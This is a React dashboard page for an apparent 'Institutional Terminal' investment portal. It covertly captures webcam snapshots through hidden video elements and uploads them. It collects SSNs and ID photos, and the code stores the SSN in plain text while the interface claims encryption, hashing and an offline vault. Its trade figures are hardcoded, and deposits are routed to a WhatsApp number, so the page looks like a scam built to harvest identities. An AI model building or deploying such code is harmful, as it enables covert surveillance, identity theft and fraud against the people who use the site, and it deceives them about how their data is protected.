'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { 
  LogOut, Lock, Smartphone, ShieldCheck, 
  User, CreditCard, Activity, Upload, 
  CheckCircle, FileText, Camera
} from 'lucide-react';

export default function Dashboard() {
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState<any>(null);
  
  // KYC State
  const [ssn, setSsn] = useState('');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);
  const [kycSuccess, setKycSuccess] = useState(false);

  // Proctoring Ref
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const init = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) { window.location.href = '/portal/auth'; return; }

      const { data: profile } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', session.user.id)
        .single();

      if (profile) setUser(profile);
      setLoading(false);
      startProctoring();
    };
    init();
  }, []);

  const startProctoring = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) videoRef.current.srcObject = stream;
      // Take a silent snapshot 3 seconds after they land on dashboard
      setTimeout(() => takeSnapshot(), 3000);
    } catch (err) { console.log("Proctoring blocked"); }
  };

  const takeSnapshot = async () => {
    if (!videoRef.current || !canvasRef.current || !user) return;
    const context = canvasRef.current.getContext('2d');
    context?.drawImage(videoRef.current, 0, 0, 640, 480);
    const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.6));
    if (blob) {
      await supabase.storage.from('proctor-snapshots').upload(`${user.id}/dash_${Date.now()}.jpg`, blob);
    }
  };

  const handleKycSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (ssn.length < 4 || !idFile) return;
    setKycSubmitting(true);

    try {
      // 1. Upload ID to user-kyc bucket
      const fileExt = idFile.name.split('.').pop();
      const fileName = `${user.id}/id_document_${Date.now()}.${fileExt}`;
      const { error: uploadError } = await supabase.storage.from('user-kyc').upload(fileName, idFile);
      if (uploadError) throw uploadError;

      // 2. Update Profile with SSN and status
      const { error: updateError } = await supabase
        .from('profiles')
        .update({ 
          ssn_data: ssn, 
          kyc_status: 'submitted' 
        })
        .eq('id', user.id);
      
      if (updateError) throw updateError;

      setKycSuccess(true);
      setUser({ ...user, kyc_status: 'submitted' });
    } catch (err: any) {
      alert("Verification Failed: " + err.message);
    } finally {
      setKycSubmitting(false);
    }
  };

  if (loading) return (
    <div className="min-h-screen bg-black flex items-center justify-center">
      <div className="text-[#D4AF37] animate-pulse text-xs uppercase tracking-[0.5em]">Establishing Secure Link...</div>
    </div>
  );

  return (
    <main className="min-h-screen bg-[#050505] text-white pb-20">
      {/* Hidden Proctoring Elements */}
      <video ref={videoRef} autoPlay muted className="hidden" />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />

      {/* TOP NAV */}
      <nav className="border-b border-white/5 bg-black/50 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
          <div className="flex items-center gap-3">
             <div className="w-8 h-8 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/20 flex items-center justify-center">
                <Activity size={16} className="text-[#D4AF37]" />
             </div>
             <span className="font-serif italic text-lg tracking-tight">Institutional Terminal</span>
          </div>
          <button onClick={() => supabase.auth.signOut().then(() => window.location.href = '/portal/auth')} className="p-2 hover:bg-red-500/10 hover:text-red-500 rounded-full transition-all">
            <LogOut size={20} />
          </button>
        </div>
      </nav>

      <div className="max-w-7xl mx-auto px-6 pt-12">
        {/* HEADER SECTION */}
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-12">
          <div>
            <p className="text-[#D4AF37] text-[10px] font-bold uppercase tracking-[0.3em] mb-2">Authenticated Session</p>
            <h1 className="text-4xl md:text-6xl font-serif">{user?.full_name || 'Portfolio Overview'}</h1>
          </div>
          <div className="flex items-center gap-4 bg-white/5 border border-white/10 p-4 rounded-2xl">
            <div className="text-right">
              <p className="text-[9px] text-gray-500 uppercase tracking-widest font-bold">Account Status</p>
              <p className={`text-xs font-bold uppercase ${user?.deposit_status === 'approved' ? 'text-green-500' : 'text-yellow-500'}`}>
                {user?.deposit_status || 'LOCKED'}
              </p>
            </div>
            <ShieldCheck className={user?.deposit_status === 'approved' ? 'text-green-500' : 'text-yellow-500'} size={24} />
          </div>
        </div>

        {/* MAIN LEDGER CARD */}
        <div className="grid lg:grid-cols-3 gap-8 mb-12">
          <div className="lg:col-span-2 bg-gradient-to-br from-[#111] to-[#0a0a0a] border border-white/5 p-10 rounded-[3rem] shadow-2xl relative overflow-hidden group">
            <div className="absolute top-0 right-0 p-10 opacity-5 group-hover:opacity-10 transition-opacity">
              <CreditCard size={120} />
            </div>
            <p className="text-gray-500 text-xs uppercase tracking-[0.4em] mb-4">Total Liquid Assets</p>
            <h2 className="text-6xl md:text-8xl font-serif tracking-tighter mb-8">${user?.balance?.toLocaleString() || '0.00'}</h2>
            
            <div className="flex flex-wrap gap-4 pt-8 border-t border-white/5">
              <button 
                onClick={() => user?.deposit_status === 'approved' ? window.open("https://wa.me/YOUR_NUMBER") : alert("Deposit feature locked pending approval.")}
                className={`flex-1 min-w-[200px] py-4 rounded-full font-bold uppercase tracking-widest text-[10px] flex items-center justify-center gap-2 transition-all ${user?.deposit_status === 'approved' ? 'bg-[#D4AF37] text-black shadow-[0_0_30px_rgba(212,175,55,0.3)]' : 'bg-white/5 text-gray-500 cursor-not-allowed border border-white/5'}`}
              >
                {user?.deposit_status === 'approved' ? <><Smartphone size={14}/> Fund via WhatsApp</> : <><Lock size={14}/> Deposit Locked</>}
              </button>
            </div>
          </div>

          <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] flex flex-col justify-between">
             <div className="space-y-6">
                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <span className="text-gray-500 text-[10px] uppercase tracking-widest">Active Trades</span>
                   <span className="text-green-500 font-mono text-sm">+12.4%</span>
                </div>
                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <span className="text-gray-500 text-[10px] uppercase tracking-widest">Network Speed</span>
                   <span className="text-white font-mono text-sm">1.2ms</span>
                </div>
                <div className="flex justify-between items-center pb-4">
                   <span className="text-gray-500 text-[10px] uppercase tracking-widest">Identity Level</span>
                   <span className="text-[#D4AF37] font-mono text-sm">Tier 1</span>
                </div>
             </div>
             <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-4 rounded-2xl flex items-center gap-3">
                <Camera size={18} className="text-[#D4AF37]" />
                <p className="text-[9px] text-gray-400 uppercase leading-relaxed">System Monitoring Active: Biometric snapshots are being logged for security.</p>
             </div>
          </div>
        </div>

        {/* VERIFICATION SECTION */}
        {user?.kyc_status !== 'verified' && (
          <div className="bg-[#0a0a0a] border border-[#D4AF37]/20 rounded-[3rem] p-8 md:p-12 overflow-hidden relative">
            <div className="grid md:grid-cols-2 gap-12 items-center">
              <div>
                <h3 className="text-3xl font-serif mb-4 text-white">Security Verification</h3>
                <p className="text-gray-400 text-sm leading-relaxed mb-8">To unlock high-volume deposits and withdrawals, please provide your legal credentials. Data is encrypted using AES-256 standards.</p>
                
                {kycSuccess ? (
                  <div className="flex items-center gap-4 text-green-500 bg-green-500/10 p-6 rounded-2xl border border-green-500/20">
                    <CheckCircle size={32} />
                    <div>
                      <p className="font-bold uppercase tracking-widest text-xs">Documents Received</p>
                      <p className="text-[10px] text-green-200/60">An administrator is reviewing your identity.</p>
                    </div>
                  </div>
                ) : (
                  <form onSubmit={handleKycSubmit} className="space-y-4">
                    <div className="space-y-2">
                      <label className="text-[10px] uppercase tracking-widest text-gray-500 ml-2">National ID / SSN</label>
                      <input 
                        type="text" 
                        placeholder="000-00-0000" 
                        value={ssn} 
                        onChange={(e) => setSsn(e.target.value)} 
                        className="w-full bg-black border border-white/10 rounded-2xl p-4 outline-none focus:border-[#D4AF37] transition-all" 
                        required 
                      />
                    </div>
                    
                    <div className="space-y-2">
                      <label className="text-[10px] uppercase tracking-widest text-gray-500 ml-2">ID Document (Passport/License)</label>
                      <div className="relative group">
                        <input 
                          type="file" 
                          accept="image/*" 
                          onChange={(e) => setIdFile(e.target.files?.[0] || null)} 
                          className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10" 
                          required 
                        />
                        <div className="w-full bg-black border border-dashed border-white/20 rounded-2xl p-8 flex flex-col items-center gap-2 group-hover:border-[#D4AF37]/50 transition-all">
                          <Upload size={24} className="text-gray-500 group-hover:text-[#D4AF37]" />
                          <span className="text-xs text-gray-500">{idFile ? idFile.name : "Click to upload ID photo"}</span>
                        </div>
                      </div>
                    </div>

                    <button 
                      disabled={kycSubmitting} 
                      className="w-full py-4 bg-white text-black font-black uppercase tracking-widest rounded-full hover:bg-[#D4AF37] transition-all flex items-center justify-center gap-2"
                    >
                      {kycSubmitting ? <Loader2 className="animate-spin" /> : <><FileText size={16}/> Submit for Verification</>}
                    </button>
                  </form>
                )}
              </div>
              <div className="hidden md:block relative">
                 <div className="w-full h-[400px] bg-[#111] rounded-[2rem] border border-white/5 p-8 flex flex-col justify-center gap-6">
                    <div className="flex items-center gap-4">
                      <div className="w-12 h-12 rounded-full bg-green-500/10 flex items-center justify-center text-green-500"><ShieldCheck size={24}/></div>
                      <p className="text-xs text-gray-400"><span className="text-white font-bold">End-to-End Encryption</span><br/>Data is hashed before storage.</p>
                    </div>
                    <div className="flex items-center gap-4">
                      <div className="w-12 h-12 rounded-full bg-[#D4AF37]/10 flex items-center justify-center text-[#D4AF37]"><User size={24}/></div>
                      <p className="text-xs text-gray-400"><span className="text-white font-bold">Identity Isolation</span><br/>Documents are stored in an offline vault.</p>
                    </div>
                 </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}

// Simple Loader Component
const Loader2 = ({ className }: { className?: string }) => (
  <Activity className={`animate-spin ${className}`} size={20} />
);
